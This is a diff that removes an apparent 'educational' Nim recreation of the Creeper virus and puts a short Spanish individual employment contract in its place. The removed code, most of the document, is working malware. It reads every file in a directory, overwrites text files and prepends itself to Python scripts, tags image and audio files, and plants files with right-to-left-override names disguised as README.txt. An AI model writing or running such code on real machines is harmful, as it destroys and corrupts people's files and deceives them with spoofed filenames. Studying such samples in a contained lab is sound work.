@@ -1,182 +1,31 @@
-# Creeper (1971) - Educational virus (Nim version)
-# Compile: nim c creeper.nim
+CONTRATO DE TRABAJO INDIVIDUAL
 
-import os, strutils, times, sequtils
+En la ciudad de Buenos Aires, a los 15 dias del mes de marzo de 2026, entre
+el Sr. Juan Carlos Martinez, DNI 23.456.789, en adelante "EL EMPLEADOR", y
+la Sra. Maria Elena Rodriguez, DNI 30.123.456, en adelante "EL EMPLEADO",
+se celebra el presente Contrato de Trabajo.
 
-const SelfSource = "creeper.nim"
-const Rtl = "\u202E"
+CLAUSULA PRIMERA: EL EMPLEADO se desempenara como Analista de Sistemas
+Senior en el Departamento de Tecnologia de la empresa.
 
-proc timestamp(): string =
-  let t = now()
-  result = $t.hour & ":" & $t.minute & ":" & $t.second
+CLAUSULA SEGUNDA: La relacion laboral tendra una duracion indeterminada a
+partir del 1 de abril de 2026.
 
-proc readSource(): string =
-  try:
-    result = readFile(SelfSource)
-  except:
-    result = "# source unavailable"
+CLAUSULA TERCERA: La remuneracion convenida es de $580.000 (pesos quinientos
+ochenta mil) mensuales, con los incrementos que disponga la legislacion.
 
-proc exfiltrate(path: string) =
-  let name = extractFilename(path)
-  let ext = splitFile(path).ext.toLowerAscii()
-  let data = try: readFile(path) except: return
-  let size = data.len
+CLAUSULA CUARTA: La jornada laboral sera de lunes a viernes de 9:00 a 18:00
+horas, con una hora de descanso para almuerzo.
 
-  case ext
-  of ".txt":
-    let lines = data.countLines()
-    echo "[creep] reading: ", name, " (exfiltrated ", size, " bytes, ", lines, " lines)"
-  of ".csv":
-    let rows = data.countLines() - 1
-    echo "[creep] reading: ", name, " (parsed ", rows, " rows)"
-  of ".html":
-    let tags = data.count('<')
-    echo "[creep] reading: ", name, " (found ", tags, " HTML tags)"
-  of ".md":
-    let headers = data.splitLines().filterIt(it.startsWith('#')).len
-    echo "[creep] reading: ", name, " (found ", headers, " headers)"
-  of ".py":
-    let lines = data.countLines()
-    echo "[creep] reading: ", name, " (script, ", lines, " lines)"
-  of ".png", ".jpg", ".jpeg", ".mp3":
-    echo "[creep] reading: ", name, " (", size, " bytes, binary)"
-  of ".docx", ".xlsx", ".pptx":
-    echo "[creep] reading: ", name, " (office document, ", size, " bytes)"
-  else:
-    discard
+CLAUSULA QUINTA: EL EMPLEADO gozara de 15 dias habiles de vacaciones anuales
+remuneradas conforme al regimen legal vigente.
 
-proc infectFile(path: string; code: string): bool =
-  let name = extractFilename(path)
-  let ext = splitFile(path).ext.toLowerAscii()
-  
-  if name.startsWith("README") or name.contains(Rtl): return false
-  if name == SelfSource: return false
-  if name.endsWith(".exe") or name.endsWith(".go") or name.endsWith(".nim") or
-     name.endsWith(".c") or name.endsWith(".cpp") or name == "setup_lab.py": return false
+CLAUSULA SEXTA: Cualquier modificacion al presente contrato debera constar
+por escrito y ser firmada por ambas partes.
 
-  case ext
-  of ".py":
-    try:
-      let orig = readFile(path)
-      let infected = code & "\n# === INFECTED BY CREEPER ===\n" & orig
-      writeFile(path, infected)
-      echo "[creep] infected: ", name, " (prepended virus code)"
-      return true
-    except: discard
-  of ".txt":
-    try:
-      writeFile(path, code)
-      echo "[creep] infected: ", name, " (overwritten with virus)"
-      return true
-    except: discard
-  else: discard
+En prueba de conformidad, se firman dos ejemplares de un mismo tenor y a un
+solo efecto en el lugar y fecha indicados.
 
-proc infectBinary(path: string): bool =
-  let name = extractFilename(path)
-  let ext = splitFile(path).ext.toLowerAscii()
-
-  if name.contains(Rtl) or name == SelfSource: return false
-
-  let dur = epochTime()
-  let marker = "\n[CREEPER-INFECTED]\nTimestamp: " & $dur & "\n"
-
-  var data = try: readFile(path) except: return
-  if data.contains("[CREEPER-INFECTED]"):
-    return false
-
-  case ext
-  of ".png":
-    let pos = data.find("IEND")
-    if pos >= 0:
-      let split = pos + 8
-      if split <= data.len:
-        var newData = data[0..<split] & marker & data[split..^1]
-        try:
-          writeFile(path, newData)
-          echo "[creep] infected: ", name, " (appended marker after IEND)"
-          return true
-        except: discard
-  of ".jpg", ".jpeg":
-    if data.len >= 2 and data[^2..^1] == [0xFF.char, 0xD9.char]:
-      var newData = data[0..^3] & marker & "\xff\xd9"
-      try:
-        writeFile(path, newData)
-        echo "[creep] infected: ", name, " (appended marker before EOI)"
-        return true
-      except: discard
-  of ".mp3":
-    try:
-      var f = open(path, fmAppend)
-      f.write(marker)
-      f.close()
-      echo "[creep] infected: ", name, " (appended marker)"
-      return true
-    except: discard
-  else: discard
-
-proc spawnRtl(code: string): int =
-  for i in 0..2:
-    let name = "README" & $i & Rtl & "txt.py"
-    if not fileExists(name):
-      try:
-        writeFile(name, code)
-        echo "[creep] RTL-spawned: ", name.repr
-        echo "        (looks like README", i, ".txt in Explorer)"
-        inc result
-      except: discard
-
-proc writeLog(readCount, infectedCount, rtlCount: int) =
-  let log = "=== CREEPER VIRUS - INFECTION LOG ===\n" &
-    "Execution: " & $now() & "\n" &
-    "Source: " & SelfSource & "\n\n" &
-    "Files read: " & $readCount & "\n" &
-    "Files infected: " & $infectedCount & "\n" &
-    "  - regular:  " & $(infectedCount - rtlCount) & "\n" &
-    "  - RTL clones: " & $rtlCount & "\n" &
-    "======================================\n"
-  try: writeFile("infection.log", log) except: discard
-
-proc main() =
-  echo "I'M THE CREEPER: CATCH ME IF YOU CAN.\n"
-
-  let code = readSource()
-  var readCount = 0
-  var infectCount = 0
-
-  let files = toSeq(walkDir(".", relative = true))
-
-  # 1. READ
-  for (kind, f) in files:
-    if kind != pcFile: continue
-    if f == SelfSource or f == "setup_lab.py" or f.startsWith("README") or f.endsWith(".exe"): continue
-    exfiltrate(f)
-    inc readCount
-
-  # 2. INFECT
-  for (kind, f) in files:
-    if kind != pcFile: continue
-    let ext = splitFile(f).ext.toLowerAscii()
-    case ext
-    of ".py", ".txt":
-      if infectFile(f, code): inc infectCount
-    of ".png", ".jpg", ".jpeg", ".mp3":
-      if infectBinary(f): inc infectCount
-    else: discard
-
-  # 3. RTL
-  let rtlCount = spawnRtl(code)
-  infectCount += rtlCount
-
-  # 4. Log
-  writeLog(readCount, infectCount, rtlCount)
-
-  # 5. Report
-  echo "\n[creep] activity logged to: infection.log"
-  echo "[creep] files read:     ", readCount
-  echo "[creep] files infected: ", infectCount
-  echo "[creep]   - regular:  ", infectCount - rtlCount
-  echo "[creep]   - RTL clones: ", rtlCount
-  echo "[creep] use antivirus to remove me"
-
-when isMainModule:
-  main()
+_________________________              _________________________
+    EL EMPLEADOR                           EL EMPLEADO
+    Juan Carlos Martinez                   Maria Elena Rodriguez
